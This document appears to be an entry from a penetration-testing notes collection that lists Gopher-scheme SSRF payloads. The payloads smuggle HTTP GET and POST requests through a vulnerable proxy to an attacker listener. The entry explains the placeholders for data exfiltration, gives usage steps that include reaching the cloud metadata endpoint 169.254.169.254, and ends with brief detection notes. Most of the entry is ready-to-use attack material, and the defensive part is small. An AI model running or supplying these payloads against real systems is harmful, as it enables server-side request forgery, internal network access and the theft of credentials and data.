---
type: code
language: plaintext
verified: true
tags:
  - gopher
  - ssrf
  - payload
platforms:
  - web
validated: true
---

# Gopher-SSRF-GET-POST-Payloads

## Code

```plaintext
gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
```

## Description

These plaintext Gopher URL payloads encode HTTP GET and POST requests for use in SSRF exploitation. The GET payload smuggles a simple resource fetch, while the POST includes headers and body data, allowing request forgery to attacker listeners or internal services.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| <proxyserver> | IP/hostname of the vulnerable server/proxy port | 192.168.1.100:8080 |
| <attacker> | IP/hostname of attacker listener or target resource | 10.0.0.5 |
| /x | Path on the target resource (customize for exfil) | /metadata |
| Cookie: eatme | Example header for POST (modify as needed) | Authorization: Bearer token |
| I am a post body | POST body content (URL-encode for injection) | {"data":"exfil"} |

## Usage

Substitute placeholders and inject the full Gopher URL into the vulnerable parameter (e.g., via curl). Use for external exfil (attacker listener) or internal access (e.g., replace http://<attacker> with http://169.254.169.254). Common in web apps with URL fetchers; test with Burp Repeater for encoding tweaks.

## Detection

- Web server access logs showing gopher:// scheme or unusual URL encoding (%0A, %0D).
- Network logs with outbound connections to legacy Gopher ports (70) or encoded HTTP smuggling.
- WAF alerts on SSRF patterns; monitor for HTTP requests originating from web server IPs to internal/non-standard destinations.

## Related

- [[procedures/Exploit-SSRF-Using-Gopher-Proxy]]
